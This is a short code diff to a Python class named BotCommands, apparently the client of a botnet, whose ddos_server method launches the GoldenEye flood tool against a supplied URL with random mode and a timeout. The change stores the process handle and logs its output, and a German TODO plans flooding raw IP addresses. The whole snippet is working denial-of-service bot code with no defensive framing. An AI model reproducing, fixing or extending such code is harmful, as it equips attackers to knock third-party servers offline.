@@ -21,11 +21,12 @@ class BotCommands(object):
     def ddos_server(self, url=None, ip=None, timeout=10):
         if self.ddos_process is None or not self.ddos_process.poll():
             if self.ddos_process is not None:
-                logging.debug("goldeneye: %s" % self.ddos_process.communicate())
+                stdout, stderr = self.ddos_process.communicate()
+                logging.debug("goldeneye: %s %s"%(stdout, stderr))
 
             if url:
-                ddos_process = subprocess.Popen(
-                    shlex.split("timeout %d goldeneye %s -m random "%(timeout, url)))
+                self.ddos_process = subprocess.Popen(shlex.split("timeout %d goldeneye %s -m random "%(timeout, url)),
+                                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             elif ip:
                 # TODO: DDOS eine IP
                 pass
